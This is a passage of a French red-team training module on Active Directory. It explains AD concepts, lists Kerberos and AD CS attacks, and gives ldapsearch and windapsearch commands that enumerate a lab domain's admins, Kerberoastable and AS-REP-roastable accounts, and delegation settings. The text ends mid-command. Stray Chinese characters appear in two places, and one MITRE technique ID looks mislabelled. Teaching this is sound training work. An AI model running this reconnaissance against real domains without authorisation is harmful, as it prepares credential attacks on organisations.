# Module 7 — Active Directory : Infrastructure & Attaques

> **Jour 2 — Red Team Training**  
> Durée estimée : 8–10 heures  
> Niveau : Intermédiaire / Avancé  
> Auteur : Red Team — SDV M2 2026

> **Cible du lab :** DC01 (`10.0.1.10`) — Domaine `redteam.lab`  
> **Lancer le lab :** `cd lab-ad && bash setup.sh start`  
> Toutes les commandes s'exécutent depuis la machine attaquante (Kali) sauf indication contraire.

---

## Table des matières

1. [Introduction à Active Directory](#1-introduction-à-active-directory)
2. [Énumération AD — LDAP](#2-énumération-ad--ldap)
3. [BloodHound](#3-bloodhound)
4. [Responder — Empoisonnement LLMNR/NBT-NS](#4-responder--empoisonnement-llmnrnbt-ns)
5. [CrackMapExec](#5-crackmapexec)
6. [Impacket](#6-impacket)
7. [Énumération sans authentification](#7-énumération-sans-authentification)
8. [TP Synthèse](#8-tp-synthèse)

---

## 1. Introduction à Active Directory

### 1.1 Qu'est-ce qu'Active Directory ?

Active Directory (AD) est le service d'annuaire de Microsoft utilisé pour gérer les identités, les accès et les politiques de sécurité dans un environnement Windows entreprise. Développé à partir de Windows 2000, AD s'appuie sur des standards ouverts comme **LDAP** (Lightweight Directory Access Protocol), **Kerberos**, et **DNS**.

AD permet de :
- Centraliser l'authentification et l'autorisation
- Déployer des politiques de groupe (GPO)
- Gérer les utilisateurs, groupes, ordinateurs, imprimantes, serveurs
- Fédérer des identités avec d'autres annuaires (ADFS)

Pour un attaquant Red Team, AD est **la cible centrale** de tout engagement en environnement Windows. Compromettre un contrôleur de domaine équivaut à compromettre **la totalité du réseau**.

### 1.2 Concepts clés

#### Domaine

Un **domaine** est l'unité administrative principale d'AD. Il s'agit d'un ensemble d'objets (utilisateurs, groupes, ordinateurs) qui partagent une base de données d'annuaire commune, stockée sur les contrôleurs de domaine.

```
Exemple : sdv-m2.lab
├── Utilisateurs
│   ├── jdoe
│   ├── asmith
│   └── admin01
├── Groupes
│   ├── Domain Admins
│   ├── Domain Users
│   └── Enterprise Admins
├── Ordinateurs
│   ├── DC01.sdv-m2.lab
│   └── SRV-APP.sdv-m2.lab
└── Unités d'organisation (OU)
    ├── OU=Paris
    └── OU=Lyon
```

Le nom de domaine complet (FQDN) d'un domaine AD suit la syntaxe DNS : `sdv-m2.lab`. Le **NetBIOS** est généralement la partie gauche avant le premier point : `SDV-M2`.

#### Forêt (Forest)

Une **forêt** est la frontière de sécurité supérieure dans AD. Elle contient un ou plusieurs domaines qui partagent :
- Un schema commun (définition des classes d'objets et attributs)
- Un catalogue global (Global Catalog)
- Une configuration commune
- Des relations de confiance transitives automatiques entre les domaines

```
Forêt: sdv-m2.lab
├── Domaine: sdv-m2.lab (domaine racine)
├── Domaine: europe.sdv-m2.lab
└── Domaine: asia.sdv-m2.lab
```

Les administrateurs **Enterprise Admins** (domaine racine) ont des privilèges sur **tous les domaines** de la forêt.

#### Contrôleur de domaine (DC)

Le **Domain Controller** est le serveur qui héberge la base de données AD (NTDS.dit) et fournit les services d'authentification, d'annuaire LDAP, de Kerberos, et de DNS. Chaque domaine doit avoir au moins un DC. En production, on en trouve généralement 2 ou plus pour la haute disponibilité.

Le fichier critique : `C:\Windows\NTDS\NTDS.dit`

Ce fichier contient **tous les hashs de mots de passe** du domaine. C'est l'objectif ultime d'une extraction par `secretsdump.py`.

#### Unité d'organisation (OU)

Les OU sont des conteneurs hiérarchiques qui permettent d'organiser les objets AD. Contrairement aux groupes, les OU sont utilisées pour :
- Déployer des GPO (Stratégies de groupe)
- Déléguer des droits d'administration
- Organiser logiquement les ressources

```
sdv-m2.lab
├── OU=Utilisateurs
│   ├── OU=Direction
│   ├── OU=IT
│   └── OU=Comptabilite
├── OU=Ordinateurs
│   ├── OU=Postes
│   └── OU=Serveurs
└── OU=Groupes
```

#### Relations de confiance (Trusts)

Les trusts permettent aux utilisateurs d'un domaine d'accéder aux ressources d'un autre domaine.

| Type | Description |
|------|-------------|
| Transitive | La confiance s'étend aux domaines enfants automatiquement |
| One-way | Domaine A fait confiance à B, mais pas l'inverse |
| Two-way | Confiance réciproque entre deux domaines |
| Forest trust | Confiance entre deux forêts entières |
| External trust | Confiance vers un domaine hors de la forêt |
| Realm trust | Confiance vers un realm Kerberos non-Windows |

Un attaquant peut exploiter les trusts pour se déplacer latéralement d'un domaine à un autre ("forest hopping").

---

### 1.3 Protocoles fondamentaux

#### Kerberos

Kerberos est le protocole d'authentification principal d'AD (RFC 4120). Il remplace NTLM dans la mesure du possible.

**Composants :**
- **KDC** (Key Distribution Center) : service sur le DC qui délivre les tickets
- **TGT** (Ticket-Granting Ticket) : ticket de session utilisateur
- **TGS** (Ticket-Granting Service) : ticket pour un service spécifique
- **AS** (Authentication Service) : première étape d'authentification
- **SPN** (Service Principal Name) : identifiant unique d'un service

**Flow d'authentification Kerberos :**

```
Utilisateur (client)                  KDC (DC)                     Service (serveur)
     │                                  │                              │
     │  1. AS-REQ (demande TGT)         │                              │
     │  ───────────────────────────────►│                              │
     │                                  │                              │
     │  2. AS-REP (TGT + clé de session)│                              │
     │  ◄───────────────────────────────│                              │
     │                                  │                              │
     │  3. TGS-REQ (TGT + SPN)          │                              │
     │  ───────────────────────────────►│                              │
     │                                  │                              │
     │  4. TGS-REP (TGS pour le service)│                              │
     │  ◄───────────────────────────────│                              │
     │                                  │                              │
     │  5. AP-REQ (TGS vers service)    │                              │
     │  ──────────────────────────────────────────────────────────────►│
     │                                  │                              │
     │  6. AP-REP (authentification)    │                              │
     │  ◄──────────────────────────────────────────────────────────────│
```

**Attaques Kerberos :**
- **Kerberoasting** (T1558.003) : demande de TGS pour un compte de service, extraction du hash du SPN, crack offline
- **AS-REP Roasting** (T1558.004) : cible les utilisateurs sans pré-authentification Kerberos
- **Pass-the-Ticket** (T1550.003) : rejeu d'un ticket Kerberos volé
- **Golden Ticket** (T1558.001) : forge d'un TGT avec le hash KRBTGT
- **Silver Ticket** (T1558.002) : forge d'un TGS pour un service spécifique
- **DCSync** (T1003.006) : imitation d'un DC pour répliquer les hashs

#### LDAP (Lightweight Directory Access Protocol)

LDAP est le protocole d'accès à l'annuaire AD. Il fonctionne sur les ports :
- **389** (TCP) : LDAP standard
- **636** (TCP) : LDAPS (LDAP over SSL/TLS)
- **3268** (TCP) : Global Catalog (GC)
- **3269** (TCP) : Global Catalog SSL

Les opérations LDAP principales :
- `bind` : authentification
- `search` : recherche d'objets
- `compare` : comparaison d'attributs
- `add` / `delete` / `modify` : modification de l'annuaire

Le **distinguished name (DN)** est le chemin unique d'un objet dans l'arbre LDAP :
```
CN=jdoe,OU=Utilisateurs,DC=sdv-m2,DC=lab
│   │            │              │
│   │            │              └── Domain Component
│   │            └── Organizational Unit
│   └── Common Name (utilisateur)
└── Préfixe de l'objet
```

#### DNS (Domain Name System)

AD est **intégralement dépendant du DNS**. Chaque DC enregistre des enregistrements SRV qui permettent aux clients de localiser les services AD :

```
_ldap._tcp.sdv-m2.lab.  →  dc01.sdv-m2.lab:389
_kerberos._tcp.sdv-m2.lab.  →  dc01.sdv-m2.lab:88
_gc._tcp.sdv-m2.lab.  →  dc01.sdv-m2.lab:3268
```

Sans DNS fonctionnel, AD ne peut pas fonctionner.

#### SMB (Server Message Block)

SMB est le protocole de partage de fichiers et d'impression utilisé par AD pour :
- La réplication entre DCs (FRS/DFSR)
- Les partages de fichiers (SYSVOL, NETLOGON)
- L'authentification NTLM over SMB

Le partage `SYSVOL` est particulièrement intéressant pour un attaquant :
```
\\sdv-m2.lab\SYSVOL\sdv-m2.lab\
└── Policies
    ├── {GUID-1}
    │   ├── Machine
    │   └── User
    │       └── scripts
    │           └── logon.bat     ← mots de passe en clair possibles
    └── {GUID-2}
```

Les scripts de connexion stockés dans SYSVOL contiennent souvent des mots de passe en clair ou des secrets.

#### NTLM

NTLM (NT LAN Manager) est l'ancien protocole d'authentification Microsoft, aujourd'hui déprécié mais toujours présent pour la rétrocompatibilité.

**Versions :**
- **NTLMv1** : extrêmement faible, cassable en temps réel
- **NTLMv2** : plus fort mais vulnérable au relais (relay)

Le handshake NTLM :
```
Client                          Serveur
   │                               │
   │  1. NEGOTIATE (négociation)   │
   │  ───────────────────────────►│
   │                               │
   │  2. CHALLENGE (défi 8 bytes)  │
   │  ◄────────────────────────────│
   │                               │
   │  3. AUTHENTICATE (hash + défi)│
   │  ───────────────────────────►│
```

Le hash NTLMv2 capturé par Responder peut être :
- Craqué offline (hashcat mode 5600 pour NTLMv2)
- Relayé vers un autre serveur SMB

---

### 1.4 Services AD majeurs

#### AD DS (Active Directory Domain Services)

Service principal d'annuaire. Fournit :
- Authentification (Kerberos, NTLM)
- Autorisation (ACLs, groupes)
- Stockage des objets (NTDS.dit)
- Réplication entre DCs
- Catalogue global

#### AD CS (Active Directory Certificate Services)

Service de certificats (PKI). Permet :
- Délivrance de certificats aux utilisateurs et ordinateurs
- Smart card authentication
- Chiffrement (EFS, BitLocker)
- Signature de code

**Attaques AD CS :**
- **ESC1** : certificat avec SAN modifiable → usurpation d'identité
- **ESC2** : template avec autorisation de "Any Purpose" EKU
- **ESC3** : template avec "Enrollment Agent" EKU
- **ESC4** : droits d'écriture sur un template
- **ESC6** : EDITF_ATTRIBUTESUBJECTALTNAME2 activé
- **ESC8** : relais HTTP vers AD CS (NTLM relay)
- **Theft** : vol de certificats (certipy export / mimikatz)

#### AD FS (Active Directory Federation Services)

Service de fédération d'identités. Permet le Single Sign-On (SSO) entre organisations. Point d'entrée pour :
- **Golden SAML** : forge de tokens SAML avec la clé privée AD FS
- **DKM** : extraction de la clé de déchiffrement AD FS

---

### 1.5 NIS2 et sécurisation AD

La directive **NIS2** (Network and Information Security 2) est entrée en vigueur en 2024 dans l'Union Européenne. L'article 21 impose des mesures de cybersécurité pour les entités essentielles et importantes.

**Mesures NIS2 applicables à AD :**

| Article | Mesure | Implémentation AD |
|---------|--------|-------------------|
| Art. 21(2)(a) | Politiques d'analyse des risques | Audit régulier des ACL AD |
| Art. 21(2)(b) | Gestion des incidents | Monitoring des événements AD (4662, 5136, 4670) |
| Art. 21(2)(c) | Continuité d'activité | Multiples DCs, sauvegarde NTDS.dit chiffré |
| Art. 21(2)(d) | Sécurité des chaînes d'approvisionnement | Contrôle des trusts inter-forêts |
| Art. 21(2)(e) | Sécurité des acquisitions | Désactivation des protocoles legacy |
| Art. 21(2)(f) | Bonnes pratiques cryptographiques | Désactivation NTLMv1, CBC, RC4 |
| Art. 21(2)(g) | Sécurité du personnel | Privilège minimum, PAM, tiering |
| Art. 21(2)(h) | Contrôle d'accès | DACL restrictives, RBAC, MFA |
| Art. 21(2)(i) | Journalisation et surveillance | SIEM + corrélation des logs AD |

**Bonnes pratiques de sécurisation AD :**

1. **Désactiver NTLMv1** (GPO : Network security: LAN Manager authentication level → "Send NTLMv2 responses only. Refuse LM & NTLM")
2. **Configurer la pré-authentification Kerberos** pour tous les utilisateurs (sauf cas exceptionnels)
3. **Restreindre les droits** des comptes de service (gMSA si possible)
4. **Activer la protection LAPS** (Local Administrator Password Solution) pour les mots de passe administrateur locaux
5. **Auditer les ACL** avec PingCastle ou Purple Knight
6. **Désactiver LLMNR et NetBIOS** via GPO
7. **Mettre en œuvre l'AD Tiering Model** (Microsoft ESAE / Red Forest)
8. **Configurer la Protected Users Group** (empêche l'utilisation NTLM, DES, RC4, délégation contrainte)
9. **Détection des attaques Kerberos** : monitoring des événements 4769 (Kerberoasting), 4624 (logons anormaux)
10. **Rotation régulière** du mot de passe KRBTGT (2 fois minimum)

---

## 2. Énumération AD — LDAP

### 2.1 Introduction à l'énumération LDAP

L'énumération Active Directory via LDAP est généralement la **première étape active** d'un test d'intrusion sur un environnement AD. Avec des identifiants valides (domaine + utilisateur + mot de passe ou hash), on peut interroger l'annuaire pour obtenir une cartographie complète du réseau.

**Technique MITRE ATT&CK : T1087 — Account Discovery**

> L'adversaire tente de découvrir les comptes et groupes existants pour comprendre la structure du domaine cible.

### 2.2 ldapsearch

`ldapsearch` est un outil en ligne de commande fourni par la suite **OpenLDAP**. Il permet d'interroger un annuaire LDAP avec des filtres puissants.

#### Installation

```bash
# ─── Debian/Ubuntu / Kali Linux ──────────────────────────────────────────────
# Met à jour la liste des paquets disponibles, puis installe ldap-utils (contient ldapsearch)
sudo apt update && sudo apt install -y ldap-utils

# ─── Vérification de l'installation ──────────────────────────────────────────
# Affiche la version installée pour confirmer que ldapsearch est opérationnel
ldapsearch --version
# Sortie attendue :
# @(#) $OpenLDAP: ldapsearch 2.6.7 (date) ...
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sudo apt update` | Rafraîchit la liste des paquets depuis les dépôts (nécessaire avant une installation) |
| `sudo apt install -y ldap-utils` | Installe la suite OpenLDAP contenant ldapsearch ; `-y` évite la confirmation interactive |
| `ldapsearch --version` | Vérifie que ldapsearch est installé et affiche sa version |

#### Syntaxe de base

```bash
# ─── Syntaxe générale ────────────────────────────────────────────────────────
# ldapsearch effectue une requête LDAP sur l'annuaire AD
# -H    : URI du serveur LDAP (protocole + IP/hostname)
# -D    : DN de liaison (identifiant pour l'authentification)
# -w    : Mot de passe en clair (alternative : -W pour saisie interactive)
# -b    : Base DN (point de départ de la recherche dans l'arbre LDAP)
# -s    : Scope (étendue) : base/un seul niveau/sous-arbre
# <FILTER> : Filtre LDAP RFC 4515 entre guillemets
# [ATTRIBUTES] : Attributs à retourner (séparés par des espaces)
ldapsearch -H ldap://<DC_IP> -D "<DOMAIN>\\<USER>" -w "<PASSWORD>" \
  -b "<BASE_DN>" -s <SCOPE> "<FILTER>" [ATTRIBUTES]
```

**Explication des commandes :**
| Option/Paramètre | Rôle/Explication |
|------------------|------------------|
| `ldapsearch` | Outil CLI OpenLDAP pour interroger un annuaire LDAP |
| `-H ldap://<DC_IP>` | URI du serveur LDAP ; pointe vers le contrôleur de domaine cible |
| `-D "<DOMAIN>\\<USER>"` | Bind DN : identité utilisée pour s'authentifier auprès de l'annuaire |
| `-w "<PASSWORD>"` | Mot de passe en clair (peut être remplacé par `-W` pour saisie masquée) |
| `-b "<BASE_DN>"` | Base DN : définit la racine de la recherche (ex: `DC=sdv-m2,DC=lab`) |
| `-s <SCOPE>` | Scope de recherche : `base` (objet seul), `one` (enfants directs), `sub` (tout le sous-arbre) |
| `"<FILTER>"` | Filtre LDAP RFC 4515 entre guillemets ; filtre les objets retournés |

**Paramètres :**

| Paramètre | Description | Exemple |
|-----------|-------------|---------|
| `-H` | URI LDAP du serveur | `ldap://192.168.1.10` |
| `-D` | DN de l'utilisateur (bind DN) | `CN=jdoe,CN=Users,DC=sdv-m2,DC=lab` |
| `-w` | Mot de passe | `-w 'P@ssw0rd'` |
| `-W` | Demander le mot de passe interactivement | `-W` |
| `-b` | Base DN (racine de la recherche) | `DC=sdv-m2,DC=lab` |
| `-s` | Scope (base, onelevel, subtree) | `sub` (défaut : sub) |
| `-x` | Authentification simple (obligatoire sans SASL) | `-x` |
| `-E` | Extensions LDAP (ex: paged results) | `-E pr=1000` (pagination 1000) |
| `-o` | Options supplémentaires | `-o ldif-wrap=no` |
| `-LLL` | Affichage LDIF sans commentaires | `-LLL` |
| `-l` | Time limit (secondes) | `-l 30` |
| `-z` | Size limit (nombre d'entrées) | `-z 5000` |

#### Connexion simple (authentification)

```bash
# ─── Connexion à un DC LDAP avec authentification ────────────────────────────
# Remplacez :
#   - 192.168.1.10  → IP du contrôleur de domaine
#   - sdv-m2\jdoe   → utilisateur du domaine
#   - 'P@ssw0rd'    → mot de passe
#   - DC=sdv-m2,DC=lab → base DN du domaine
# -x : utilise une authentification simple (non-SASL), obligatoire ici
# Requête sans filtre ni attribut => renvoie TOUS les objets du domaine

ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" \
  -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab"
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-x` | Authentification simple (non-SASL) ; nécessaire quand on utilise `-D` et `-w` |
| `-H ldap://192.168.1.10` | URI LDAP pointant vers le contrôleur de domaine cible |
| `-D "SDV-M2\\jdoe"` | Identifiant de liaison au format `DOMAINE\utilisateur` (NetBIOS) |
| `-w 'P@ssw0rd'` | Mot de passe de l'utilisateur jdoe |
| `-b "DC=sdv-m2,DC=lab"` | Base DN : racine de la recherche (le domaine entier) |
| *(aucun filtre)* | Sans filtre, le filtre par défaut `(objectClass=*)` s'applique → **tous** les objets |

**Sortie attendue (extrait) :**
```
# extended LDIF
# LDAPv3
# base <DC=sdv-m2,DC=lab> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# sdv-m2.lab
dn: DC=sdv-m2,DC=lab
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=sdv-m2,DC=lab
instanceType: 5
whenCreated: 20250101000000.0Z
whenChanged: 20250528000000.0Z
subRefs: DC=ForestDnsZones,DC=sdv-m2,DC=lab
subRefs: DC=DomainDnsZones,DC=sdv-m2,DC=lab
[... des milliers de lignes ...]
```

> **⚠️ Attention :** Sans filtre, cette commande renvoie TOUS les objets du domaine. Cela peut prendre plusieurs minutes et générer des centaines de milliers de lignes.

#### Filtres LDAP avancés

Les filtres LDAP utilisent la syntaxe RFC 4515. Voici les filtres les plus utiles pour un pentest :

```bash
# ─── 1. TOUS les utilisateurs ────────────────────────────────────────────────
# Filtre : objectClass=user ET objectCategory=person (exclut les comptes机器)
# Attributs demandés : nom de connexion, nom affiché, email, titre, service, DN
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail title department distinguishedName

# ─── 2. TOUS les groupes ─────────────────────────────────────────────────────
# Filtre : tous les objets de classe "group"
# Attributs : nom du groupe, description, liste des membres (DN)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "objectClass=group" \
  sAMAccountName description member

# ─── 3. TOUS les ordinateurs du domaine ──────────────────────────────────────
# Filtre : objets de classe "computer"
# Attributs : nom, nom DNS complet, OS et version (utile pour trouver les vieux OS)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=computer)" \
  name dNSHostName operatingSystem operatingSystemVersion

# ─── 4. Domain Admins (membres du groupe) ────────────────────────────────────
# Filtre : groupe de classe "group" dont le nom commun (cn) est "Domain Admins"
# Attributs : member (liste des DN des membres) et memberOf (groupes parents)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=group)(cn=Domain Admins))" \
  member memberOf

# ─── 5. Contrôleurs de domaine ───────────────────────────────────────────────
# Filtre : ordinateur dont le bit UAC 8192 (0x2000 = SERVER_TRUST_ACCOUNT) est positionné
# 1.2.840.113556.1.4.803 est l'OID pour le "bitwise AND" (masque de bits)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
  name dNSHostName

# ─── 6. Utilisateurs avec SPN (Kerberoastable) ───────────────────────────────
# Filtre : utilisateurs dont l'attribut servicePrincipalName n'est pas vide
# Ces comptes de service sont des cibles pour l'attaque Kerberoasting (T1558.003)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# ─── 7. Utilisateurs sans pré-authentification Kerberos (AS-REP Roastable) ───
# Filtre : bit UAC 4194304 (0x400000 = DONT_REQUIRE_PREAUTH) positionné
# Ces comptes sont vulnérables à l'attaque AS-REP Roasting (T1558.004)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl

# ─── 8. Utilisateurs avec privilèges élevés (adminCount=1) ───────────────────
# Filtre : utilisateurs ayant adminCount=1 (membres de groupes protégés)
# Ces comptes ont hérité de permissions spéciales via AdminSDHolder
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(adminCount=1))" \
  sAMAccountName adminCount

# ─── 9. OU et conteneurs ─────────────────────────────────────────────────────
# Filtre utilisant l'opérateur OU (|) : objects OU OU conteneurs
# Utile pour cartographier la structure administrative du domaine
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(|(objectClass=organizationalUnit)(objectClass=container))" \
  name description

# ─── 10. Politiques de mot de passe ──────────────────────────────────────────
# Filtre : objet représentant le domaine lui-même (classe domainDNS)
# Attributs : longueur min. du mot de passe, seuil de verrouillage, durée, âge max.
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=domainDNS)" \
  minPwdLength lockoutThreshold lockoutDuration maxPwdAge
```

**Explication des commandes :**

| Filtre LDAP | Usage Red Team | Rôle/Explication |
|------------|----------------|------------------|
| `(&(objectClass=user)(objectCategory=person))` | Énumération des utilisateurs | Exclut les comptes机器 (système) et les groupes ; ne garde que les personnes |
| `objectClass=group` | Cartographie des groupes | Retourne tous les groupes de sécurité et de distribution |
| `(objectClass=computer)` | Inventaire des machines | Liste tous les ordinateurs du domaine avec leur OS |
| `(&(objectClass=group)(cn=Domain Admins))` | Ciblage privilégié | Identifie les membres du groupe Domain Admins (cible haute valeur) |
| `(&(objectClass=computer)(userAccountControl:...:=8192))` | Identification des DCs | Bit 8192 (0x2000) = compte d'ordinateur de confiance pour réplication (DC) |
| `(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))` | Kerberoasting | Comptes avec SPN non vide → TGS demandable → hash extractible |
| `(&(objectClass=user)(objectCategory=person)(userAccountControl:...:=4194304))` | AS-REP Roasting | Bit 4194304 (0x400000) = pré-authentification Kerberos désactivée |
| `(&(objectClass=user)(adminCount=1))` | Comptes privilégiés | adminCount=1 signifie que l'utilisateur est dans un groupe protégé (DA, EA, etc.) |
| `(\|(objectClass=organizationalUnit)(objectClass=container))` | Structure AD | Opérateur OU logique : retourne les OU ET les conteneurs |
| `(objectClass=domainDNS)` | Politique de sécurité | Interroge l'objet domaine pour lire les attributs de password policy |

#### Filtres avec UAC (User Account Control)

Le champ `userAccountControl` est un bitmask (entier 32 bits). On utilise la règle OID `1.2.840.113556.1.4.803` pour le masquage de bits.

```bash
# ─── Bitmasks UAC importants ─────────────────────────────────────────────────
# userAccountControl est un champ bitmask 32 bits combinant plusieurs flags
# L'extension LDAP "1.2.840.113556.1.4.803" compare un masque via ET logique
# ACCOUNTDISABLE = 0x0002 (2)      → compte désactivé
# LOCKOUT = 0x0010 (16)             → compte verrouillé
# PASSWD_NOTREQD = 0x0020 (32)      → mot de passe non requis (faible sécurité)
# PASSWD_CANT_CHANGE = 0x0040 (64)  → l'utilisateur ne peut pas changer le mot de passe
# NORMAL_ACCOUNT = 0x0200 (512)     → compte utilisateur standard
# DONT_REQUIRE_PREAUTH = 0x400000 (4194304) → pas de pré-authentif. Kerberos (AS-REP)
# TRUSTED_FOR_DELEGATION = 0x80000 (524288) → délégation non contrainte
# TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 (16777216) → délégation contrainte

# ─── Comptes désactivés ──────────────────────────────────────────────────────
# Bit 2 positionné → compte désactivé (intéressant pour escalade si réactivé)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
  sAMAccountName

# ─── Comptes avec mot de passe non requis (faible sécurité) ──────────────────
# Bit 32 : mot de passe non requis → potentiel accès sans mot de passe valide
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" \
  sAMAccountName

# ─── Comptes avec délégation Kerberos non contrainte ─────────────────────────
# Bit 524288 (0x80000) : délégation non contrainte → le service peut s'identifier
# auprès de n'importe quel autre service au nom de l'utilisateur (très dangereux)
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName
```

**Explication des commandes :**
| Bit UAC | Valeur | Usage Red Team | Rôle/Explication |
|---------|--------|----------------|------------------|
| `2` (0x0002) | ACCOUNTDISABLE | Comptes désactivés à potentiellement réactiver | Un compte désactivé peut être réactivé si on a les droits |
| `32` (0x0020) | PASSWD_NOTREQD | Comptes sans mot de passe | Peut indiquer une faiblesse de sécurité exploitable |
| `524288` (0x80000) | TRUSTED_FOR_DELEGATION | Délégation non contrainte | Permet le vol de ticket (T1555) si un admin se connecte au serveur |
| OID `1.2.840.113556.1.4.803` | Bitwise AND | — | Règle de comparaison : 1 si tous les bits du masque sont positionnés |

#### Export LDIF formaté

```bash
mkdir -p exports
# ─── Export des utilisateurs en LDIF (sans wrapping des lignes) ───────────────
# -LLL : sortie LDIF sans commentaires superflus (format allégé)
# -o ldif-wrap=no : désactive le wrapping des lignes (préserve les lignes longues)
# Redirection > vers un fichier avec date dans le nom pour traçabilité
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person))" \
  -LLL -o ldif-wrap=no \
  > exports/ldap-users-$(date +%Y%m%d).ldif

# ─── Export en CSV des utilisateurs (via awk) ────────────────────────────────
# La sortie LDAP est redirigée vers awk qui parse les champs clés :
#   - Lignes "sAMAccountName:" → extrait le nom d'utilisateur
#   - Lignes "displayName:"   → extrait le nom complet
#   - Lignes "mail:"          → extrait l'email
#   - Lignes "title:"         → extrait le titre
#   - Lignes "department:"    → extrait le service
#   - Lignes vides (/^$/)     → délimiteur d'enregistrement : écrit une ligne CSV
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail title department \
  -LLL -o ldif-wrap=no \
  | awk '/^sAMAccountName:/{user=$2} /^displayName:/{name=$0; sub(/^displayName: /,"",name)} /^mail:/{mail=$2} /^title:/{title=$0; sub(/^title: /,"",title)} /^department:/{dept=$0; sub(/^department: /,"",dept)} /^$/{print user","name","mail","title","dept; user=""; name=""; mail=""; title=""; dept=""}' \
  > exports/users.csv

# ─── Vérification de l'export ────────────────────────────────────────────────
# head -5 affiche les 5 premières lignes du CSV pour validation
head -5 exports/users.csv
# Sortie attendue :
# jdoe,John Doe,jdoe@sdv-m2.lab,Ingénieur,IT
# asmith,Alice Smith,asmith@sdv-m2.lab,Analyste,Security
# bwayne,Bob Wayne,bwayne@sdv-m2.lab,Responsable,Direction
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `-LLL` | Format LDIF sans commentaires superflus (sortie épurée) |
| `-o ldif-wrap=no` | Option de sortie : désactive le wrapping des lignes (utile pour le post-traitement) |
| `> exports/ldap-users-$(date +%Y%m%d).ldif` | Redirection vers fichier avec date au format AAAAMMJJ |
| `\| awk '...'` | Pipeline vers awk pour transformer le LDIF en CSV structuré |
| `head -5 exports/users.csv` | Affiche les 5 premières lignes du CSV pour vérifier le format |

---

### 2.3 windapsearch

`windapsearch` est un script Python spécialisé dans l'énumération AD via LDAP. Il est plus simple d'utilisation que `ldapsearch` pour les recherches courantes.

#### Installation

```bash
# ─── Installation via pip ─────────────────────────────────────────────────────
# pip install le paquet windapsearch depuis PyPI (Python Package Index)
pip install windapsearch

# ─── Vérification ─────────────────────────────────────────────────────────────
# Confirme que l'outil est accessible et affiche la version installée
windapsearch --version
# Sortie attendue :
# windapsearch version 0.3.2
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `pip install windapsearch` | Installe le module Python windapsearch et ses dépendances depuis PyPI |
| `windapsearch --version` | Vérifie que l'outil est correctement installé en affichant sa version |

#### Utilisation de base

```bash
# ─── Syntaxe : windapsearch [options] ─────────────────────────────────────────
# windapsearch encapsule des requêtes LDAP pour simplifier l'énumération AD

# ─── 1. Énumérer tous les utilisateurs ────────────────────────────────────────
# -d : domaine cible  |  -u : utilisateur  |  -p : mot de passe  |  -U : users
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -U

# ─── 2. Énumérer tous les groupes ─────────────────────────────────────────────
# -G : groupes (list all groups in the domain)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -G

# ─── 3. Énumérer les membres d'un groupe spécifique ──────────────────────────
# -m : group member (affiche les membres du groupe spécifié)
windapsearch -d sdv-m2.lab \
